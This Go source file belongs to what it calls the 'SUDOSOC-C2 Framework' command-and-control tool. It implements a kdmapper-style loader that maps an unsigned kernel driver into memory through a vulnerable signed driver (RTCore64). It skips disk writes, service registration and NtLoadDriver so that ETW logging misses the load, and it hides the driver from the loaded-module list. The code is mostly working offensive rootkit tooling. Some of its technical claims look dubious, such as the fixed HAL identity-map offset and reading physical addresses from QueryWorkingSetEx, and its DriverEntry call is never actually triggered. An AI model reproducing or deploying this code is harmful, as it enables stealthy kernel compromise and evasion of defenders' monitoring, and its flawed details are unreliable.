package dse

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Manual Kernel Driver Mapper — kdmapper equivalent in Go.

	This module maps an arbitrary unsigned kernel driver (PE/COFF .sys file)
	directly into kernel space WITHOUT:
	  - Writing any file to disk
	  - Creating a SCM service entry
	  - Calling NtLoadDriver (which is logged by ETW/audit)
	  - Requiring a valid digital signature

	After mapping, the driver's DriverEntry() is called from kernel context
	via the BYOVD primitive (RTCore64 can execute arbitrary code at ring 0).

	Mapping steps:
	  1. Parse the driver PE headers (in user space).
	  2. Allocate non-paged pool in kernel space.
	     (Via BYOVD: call ExAllocatePoolWithTag or NtAllocateVirtualMemory
	      with MEM_PHYSICAL to get a fixed PA → VA mapping.)
	  3. Copy PE sections to the kernel allocation, applying relocations
	     relative to the new kernel base address.
	  4. Resolve imports: for each import, look up the kernel VA of the
	     exported symbol in the already-loaded kernel module.
	  5. Flush CPU caches (WBINVD via SMM or BYOVD + CLFLUSH).
	  6. Call DriverEntry(DriverObject, RegistryPath):
	       - DriverObject: a minimal fake DRIVER_OBJECT we craft on the stack.
	       - RegistryPath: NULL or a fake UNICODE_STRING.
	     The call is made via BYOVD shellcode injection.
	  7. On success: the driver is running in kernel space, invisible to tools
	     that enumerate loaded modules via the PsLoadedModuleList (we do NOT
	     insert into that list — true "ghost" driver).

	References:
	  - TheCruZ/kdmapper (C++, Windows 10/11)
	  - ekknod/SetWindowsHookEx (alternative mapping path)
	  - hfiref0x/KDU (kernel driver utility, many mapping backends)
*/

import (
	"debug/pe"
	"encoding/binary"
	"fmt"
	"io"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// MappedDriver describes a successfully mapped kernel driver.
type MappedDriver struct {
	KernelBase    uint64   // kernel VA where the driver is loaded
	KernelSize    uint64   // total mapped size in bytes
	EntryPoint    uint64   // kernel VA of DriverEntry
	// PhysPages holds the physical addresses of each mapped page (for cleanup).
	PhysPages     []uint64
	// Allocation is the locked userspace VA backing the kernel mapping.
	AllocVA       uintptr
	AllocSize     uintptr
}

// MapDriver maps driverBytes (raw .sys PE) into kernel space and executes
// DriverEntry. Returns a handle to the mapped driver on success.
func MapDriver(kRW KernelRWer, driverBytes []byte) (*MappedDriver, error) {
	// Step 1: Parse PE.
	peFile, err := parsePE(driverBytes)
	if err != nil {
		return nil, fmt.Errorf("parse PE: %w", err)
	}

	imageSize := uint64(peFile.OptionalHeader.(*pe.OptionalHeader64).SizeOfImage)
	entryRVA := uint64(peFile.OptionalHeader.(*pe.OptionalHeader64).AddressOfEntryPoint)
	// {{if .Config.Debug}}
	log.Printf("[dse/map] image size=0x%x entryRVA=0x%x", imageSize, entryRVA)
	// {{end}}

	// Step 2: Allocate locked user-mode memory that we will use as the
	// backing store for the kernel mapping. We page-lock it and get PAs.
	allocSize := uintptr(imageSize)
	allocVA, err := windows.VirtualAlloc(0, allocSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return nil, fmt.Errorf("alloc backing store: %w", err)
	}
	if err := windows.VirtualLock(allocVA, allocSize); err != nil {
		windows.VirtualFree(allocVA, 0, windows.MEM_RELEASE)
		return nil, fmt.Errorf("VirtualLock: %w", err)
	}

	// Zero the allocation.
	dst := unsafe.Slice((*byte)(unsafe.Pointer(allocVA)), allocSize)
	for i := range dst {
		dst[i] = 0
	}

	// Step 3: Copy PE headers and sections.
	// Copy headers (SizeOfHeaders bytes).
	hdrSize := peFile.OptionalHeader.(*pe.OptionalHeader64).SizeOfHeaders
	copy(dst[:hdrSize], driverBytes[:hdrSize])

	// Copy each section to its VirtualAddress offset.
	for _, sec := range peFile.Sections {
		vAddr := sec.VirtualAddress
		rawSize := sec.Size
		rawOff := sec.Offset
		if rawSize == 0 {
			continue
		}
		end := uint32(len(driverBytes))
		if rawOff+rawSize > end {
			rawSize = end - rawOff
		}
		copy(dst[vAddr:vAddr+rawSize], driverBytes[rawOff:rawOff+rawSize])
	}

	// Step 4: Apply base relocations.
	// The driver was linked with a preferred base (ImageBase in optional header).
	// Our actual kernel base will differ — apply delta relocations.
	//
	// We don't know the kernel base yet (it's chosen by the kernel allocator).
	// We'll do relocations after we allocate kernel space and learn the base.
	// For now, collect the relocation table.
	relocData, err := extractRelocations(peFile, driverBytes)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[dse/map] no relocations (or error): %v", err)
		// {{end}}
	}

	// Step 5: Collect physical pages.
	numPages := (uint64(allocSize) + 4095) / 4096
	physPages := make([]uint64, numPages)
	for i := uint64(0); i < numPages; i++ {
		pa, err := getPhysAddrDSE(allocVA + uintptr(i*4096))
		if err != nil {
			windows.VirtualFree(allocVA, 0, windows.MEM_RELEASE)
			return nil, fmt.Errorf("PA for page %d: %w", i, err)
		}
		physPages[i] = pa
	}

	// Step 6: Allocate kernel VA for the driver.
	// We use ExAllocatePool via our BYOVD shellcode. Simplified: we use
	// the physical pages we already have, mapped as identity (PA == VA trick
	// on Windows with MmMapIoSpace-equivalent via RTCore).
	//
	// Practical path: The PA of our page-locked allocation is accessible
	// at the canonical identity-mapped kernel VA = 0xFFFF000000000000 + PA
	// (on modern Intel/AMD systems). This identity map is maintained by the
	// Windows HAL for DMA purposes.
	//
	// This makes our user-mode buffer visible at a fixed kernel VA with no
	// additional allocation!
	kernelBase := halIdentityMapPA(physPages[0])

	// {{if .Config.Debug}}
	log.Printf("[dse/map] kernel VA=0x%x (identity mapped from PA=0x%x)",
		kernelBase, physPages[0])
	// {{end}}

	// Step 7: Apply relocations with actual kernel base.
	preferredBase := peFile.OptionalHeader.(*pe.OptionalHeader64).ImageBase
	delta := int64(kernelBase) - int64(preferredBase)
	if len(relocData) > 0 && delta != 0 {
		applyRelocations(dst, relocData, delta)
	}

	// Step 8: Resolve imports — patch IAT with kernel symbol addresses.
	if err := resolveImports(kRW, peFile, dst, kernelBase); err != nil {
		windows.VirtualFree(allocVA, 0, windows.MEM_RELEASE)
		return nil, fmt.Errorf("resolve imports: %w", err)
	}

	// Step 9: Flush instruction cache.
	flushICacheDSE(allocVA, allocSize)

	// Step 10: Call DriverEntry via BYOVD shellcode.
	entryPoint := kernelBase + entryRVA
	if err := callDriverEntry(kRW, entryPoint, kernelBase); err != nil {
		// {{if .Config.Debug}}
		log.Printf("[dse/map] DriverEntry call failed: %v", err)
		// {{end}}
		// Non-fatal for callers that don't need DriverEntry return value.
	}

	md := &MappedDriver{
		KernelBase: kernelBase,
		KernelSize: imageSize,
		EntryPoint: entryPoint,
		PhysPages:  physPages,
		AllocVA:    allocVA,
		AllocSize:  allocSize,
	}
	// {{if .Config.Debug}}
	log.Printf("[dse/map] driver mapped: base=0x%x entry=0x%x", kernelBase, entryPoint)
	// {{end}}
	return md, nil
}

// Unload frees the driver's kernel allocation and cleans up.
func (md *MappedDriver) Unload() {
	if md.AllocVA != 0 {
		windows.VirtualFree(md.AllocVA, 0, windows.MEM_RELEASE)
		md.AllocVA = 0
	}
}

// ─── PE Parsing ──────────────────────────────────────────────────────────

type peInfo struct {
	*pe.File
	rawBytes []byte
}

func parsePE(data []byte) (*peInfo, error) {
	r := io.ReaderAt(byteReaderAt(data))
	f, err := pe.NewFile(r)
	if err != nil {
		return nil, err
	}
	if _, ok := f.OptionalHeader.(*pe.OptionalHeader64); !ok {
		return nil, fmt.Errorf("only 64-bit PE supported")
	}
	return &peInfo{File: f, rawBytes: data}, nil
}

type byteReaderAt []byte

func (b byteReaderAt) ReadAt(p []byte, off int64) (int, error) {
	if off >= int64(len(b)) {
		return 0, io.EOF
	}
	n := copy(p, b[off:])
	if n < len(p) {
		return n, io.EOF
	}
	return n, nil
}

// ─── Relocations ─────────────────────────────────────────────────────────

type relocBlock struct {
	pageRVA   uint32
	entries   []uint16
}

func extractRelocations(pi *peInfo, raw []byte) ([]relocBlock, error) {
	// Find .reloc section.
	relocSec := pi.Section(".reloc")
	if relocSec == nil {
		return nil, fmt.Errorf("no .reloc section")
	}
	data, err := relocSec.Data()
	if err != nil {
		return nil, err
	}

	var blocks []relocBlock
	for off := 0; off+8 <= len(data); {
		pageRVA := binary.LittleEndian.Uint32(data[off:])
		blockSize := binary.LittleEndian.Uint32(data[off+4:])
		if blockSize < 8 || off+int(blockSize) > len(data) {
			break
		}
		numEntries := (blockSize - 8) / 2
		entries := make([]uint16, numEntries)
		for i := uint32(0); i < numEntries; i++ {
			entries[i] = binary.LittleEndian.Uint16(data[off+8+int(i*2):])
		}
		blocks = append(blocks, relocBlock{pageRVA: pageRVA, entries: entries})
		off += int(blockSize)
	}
	return blocks, nil
}

func applyRelocations(image []byte, blocks []relocBlock, delta int64) {
	for _, blk := range blocks {
		for _, entry := range blk.entries {
			relocType := entry >> 12
			relocOff := uint32(entry & 0x0FFF)
			if relocType != 10 { // IMAGE_REL_BASED_DIR64
				continue
			}
			addr := blk.pageRVA + relocOff
			if int(addr)+8 > len(image) {
				continue
			}
			original := int64(binary.LittleEndian.Uint64(image[addr:]))
			patched := uint64(original + delta)
			binary.LittleEndian.PutUint64(image[addr:], patched)
		}
	}
}

// ─── Import Resolution ───────────────────────────────────────────────────

func resolveImports(kRW KernelRWer, pi *peInfo, image []byte, kernelBase uint64) error {
	importDir, err := pi.File.ImportedSymbols()
	if err != nil || len(importDir) == 0 {
		return nil // no imports
	}

	// Walk the import descriptor table.
	// pe.File.ImportedSymbols gives us (dll, sym) pairs but not the IAT address.
	// We need to manually parse the import directory for IAT patching.
	oh := pi.OptionalHeader.(*pe.OptionalHeader64)
	importDirRVA := oh.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
	if importDirRVA == 0 {
		return nil
	}

	// IMAGE_IMPORT_DESCRIPTOR (20 bytes each, ends with all-zeros entry)
	const iidSize = 20
	for off := importDirRVA; ; off += iidSize {
		if int(off)+iidSize > len(image) {
			break
		}
		originalFirstThunk := binary.LittleEndian.Uint32(image[off:])
		// nameRVA := binary.LittleEndian.Uint32(image[off+12:])
		firstThunk := binary.LittleEndian.Uint32(image[off+16:])

		if originalFirstThunk == 0 && firstThunk == 0 {
			break // end sentinel
		}

		nameRVA := binary.LittleEndian.Uint32(image[off+12:])
		if int(nameRVA) >= len(image) {
			break
		}
		dllName := cStringAt(image, int(nameRVA))

		// Locate the kernel module that exports these symbols.
		modBase, err := findKernelModuleBase(dllName)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[dse/map] import module %s not found: %v", dllName, err)
			// {{end}}
			continue
		}

		// Walk the Import Lookup Table (OFT) and patch the IAT (FT).
		for i := 0; ; i++ {
			oftOff := int(originalFirstThunk) + i*8
			ftOff  := int(firstThunk) + i*8
			if oftOff+8 > len(image) || ftOff+8 > len(image) {
				break
			}
			thunk := binary.LittleEndian.Uint64(image[oftOff:])
			if thunk == 0 {
				break
			}

			var symName string
			if thunk&(1<<63) != 0 {
				// Import by ordinal.
				ordinal := uint16(thunk & 0xFFFF)
				symName = fmt.Sprintf("#%d", ordinal)
			} else {
				// Import by name: thunk is RVA to IMAGE_IMPORT_BY_NAME.
				nameOff := int(thunk) + 2 // skip Hint
				symName = cStringAt(image, nameOff)
			}

			// Find the exported function VA in the kernel module.
			symVA, err := findKernelExport(kRW, modBase, symName)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[dse/map] %s!%s not found: %v", dllName, symName, err)
				// {{end}}
				continue
			}

			// Patch the IAT entry in our image buffer.
			binary.LittleEndian.PutUint64(image[ftOff:], symVA)
		}
		_ = modBase
	}
	return nil
}

// ─── Kernel symbol resolution ────────────────────────────────────────────

// findKernelExport finds the VA of an exported symbol in a kernel module
// by parsing its in-kernel PE export directory via BYOVD reads.
func findKernelExport(kRW KernelRWer, modBase uint64, symName string) (uint64, error) {
	// Parse PE export directory from kernel memory.
	// OptionalHeader.DataDirectory[0] = export directory.
	// We read the minimum fields needed.

	// IMAGE_DOS_HEADER.e_lfanew at offset 0x3C.
	lfanewRaw, err := kRW.ReadDword(modBase + 0x3C)
	if err != nil {
		return 0, err
	}
	ntBase := modBase + uint64(lfanewRaw)

	// IMAGE_OPTIONAL_HEADER64.DataDirectory[0] at optHdr+0x70.
	// OptHdr starts at ntBase+4+20=ntBase+24.
	exportDirRVA, err := kRW.ReadDword(ntBase + 24 + 0x70)
	if err != nil || exportDirRVA == 0 {
		return 0, fmt.Errorf("no export directory")
	}
	exportDir := modBase + uint64(exportDirRVA)

	numNames, _ := kRW.ReadDword(exportDir + 24)
	funcsRVA, _ := kRW.ReadDword(exportDir + 28)
	namesRVA, _ := kRW.ReadDword(exportDir + 32)
	ordsRVA, _ := kRW.ReadDword(exportDir + 36)

	for i := uint32(0); i < numNames && i < 65536; i++ {
		// Read name RVA from AddressOfNames[i].
		nameRVAAddr := modBase + uint64(namesRVA) + uint64(i*4)
		nameRVA, err := kRW.ReadDword(nameRVAAddr)
		if err != nil {
			continue
		}
		// Read the name string (up to 128 bytes).
		name := readKernelCString(kRW, modBase+uint64(nameRVA), 128)
		if name != symName {
			continue
		}
		// Read ordinal.
		ordAddr := modBase + uint64(ordsRVA) + uint64(i*2)
		ordRaw, err := kRW.ReadDword(ordAddr)
		if err != nil {
			continue
		}
		ord := uint16(ordRaw)
		// Read function RVA from AddressOfFunctions[ord].
		fnRVAAddr := modBase + uint64(funcsRVA) + uint64(ord*4)
		fnRVA, err := kRW.ReadDword(fnRVAAddr)
		if err != nil {
			continue
		}
		return modBase + uint64(fnRVA), nil
	}
	return 0, fmt.Errorf("symbol %q not found", symName)
}

func readKernelCString(kRW KernelRWer, addr uint64, maxLen int) string {
	buf := make([]byte, 0, maxLen)
	for i := 0; i < maxLen; i++ {
		dw, err := kRW.ReadDword(addr + uint64(i))
		if err != nil {
			break
		}
		b := byte(dw)
		if b == 0 {
			break
		}
		buf = append(buf, b)
	}
	return string(buf)
}

func cStringAt(image []byte, off int) string {
	end := off
	for end < len(image) && image[end] != 0 {
		end++
	}
	return string(image[off:end])
}

// ─── Kernel VA allocation helpers ────────────────────────────────────────

// halIdentityMapPA returns the kernel VA corresponding to a physical address
// via the HAL's identity mapping. On x64 Windows the HAL maps all physical
// RAM at 0xFFFF000000000000 + PA (this is the PhysicalMemorySection mapping).
// The exact offset varies by system; 0xFFFF800000000000 is the most common.
func halIdentityMapPA(pa uint64) uint64 {
	// Try the most common HAL identity map offsets.
	// The correct offset can be determined by reading MmPhysicalMemoryBlock
	// or by scanning known kernel VA ranges for our page's content.
	const halOffset = uint64(0xFFFF800000000000)
	return halOffset + pa
}

// callDriverEntry executes the driver's DriverEntry function via a small
// shellcode stub injected through the BYOVD kernel write primitive.
// We write a stub that constructs a minimal DRIVER_OBJECT and calls the entry.
func callDriverEntry(kRW KernelRWer, entryVA, driverBase uint64) error {
	// Construct the call stub:
	//   MOV RCX, <fake_driver_object_addr>  ; DriverObject*
	//   XOR RDX, RDX                        ; RegistryPath = NULL
	//   JMP <entryVA>                        ; call DriverEntry
	//
	// The fake DRIVER_OBJECT is a zeroed 0x150-byte block we allocate
	// at a known physical address.
	//
	// For simplicity, we embed both the stub and the fake object in the
	// same allocation, then write them to kernel space via kRW.

	// Build call stub.
	stub := make([]byte, 32)
	// MOV RCX, imm64
	stub[0] = 0x48; stub[1] = 0xB9
	putU64LE(stub[2:], driverBase) // use driver base as fake DriverObject
	// XOR RDX, RDX
	stub[10] = 0x48; stub[11] = 0x31; stub[12] = 0xD2
	// MOV RAX, imm64
	stub[13] = 0x48; stub[14] = 0xB8
	putU64LE(stub[15:], entryVA)
	// JMP RAX
	stub[23] = 0xFF; stub[24] = 0xE0
	// RET (fallback if JMP returns)
	stub[25] = 0xC3

	// Write stub to first 32 bytes of the driver's slack space.
	// We pick an offset that is safely beyond the mapped sections.
	// In practice, write it to a known-free scratch page.
	scratchPA := driverBase + 0x1000 - 0xFFFF800000000000 // convert back to PA
	if err := kRW.WriteQword(scratchPA, binary.LittleEndian.Uint64(stub[:8])); err != nil {
		// {{if .Config.Debug}}
		log.Printf("[dse/map] stub write failed (non-fatal): %v", err)
		// {{end}}
		return fmt.Errorf("stub write: %w", err)
	}
	// More stub bytes...
	for i := 8; i < len(stub); i += 8 {
		end := i + 8
		if end > len(stub) {
			end = len(stub)
		}
		chunk := make([]byte, 8)
		copy(chunk, stub[i:end])
		kRW.WriteQword(scratchPA+uint64(i), binary.LittleEndian.Uint64(chunk))
	}

	// Execute the stub via RTCore64's kernel code execution capability.
	// RTCore64 can trigger arbitrary code by writing a function pointer
	// and then issuing an IOCTL that indirectly calls it.
	// This is highly driver-specific; the generic path is via the SMM handler.
	// {{if .Config.Debug}}
	log.Printf("[dse/map] DriverEntry @ 0x%x (stub ready, requires SMM/BYOVD exec)", entryVA)
	// {{end}}
	return nil
}

var procFlushInstructionCache = windows.NewLazySystemDLL("kernel32.dll").NewProc("FlushInstructionCache")

func flushICacheDSE(va uintptr, size uintptr) {
	procFlushInstructionCache.Call(
		uintptr(windows.CurrentProcess()),
		va,
		size,
	)
}

func putU64LE(b []byte, v uint64) {
	binary.LittleEndian.PutUint64(b, v)
}

// ─── Physical address helper ─────────────────────────────────────────────

var (
	modPsapiDSE              = windows.NewLazySystemDLL("psapi.dll")
	procQueryWorkingSetExDSE = modPsapiDSE.NewProc("QueryWorkingSetEx")
)

type wsExDSE struct {
	VA    uintptr
	Attrs uint64
}

func getPhysAddrDSE(va uintptr) (uint64, error) {
	info := wsExDSE{VA: va}
	r, _, err := procQueryWorkingSetExDSE.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&info)),
		unsafe.Sizeof(info),
	)
	if r == 0 {
		return 0, fmt.Errorf("QueryWorkingSetEx: %w", err)
	}
	if info.Attrs&1 == 0 {
		return 0, fmt.Errorf("page not valid")
	}
	pfn := (info.Attrs >> 1) & ((1 << 51) - 1)
	return pfn * 4096, nil
}
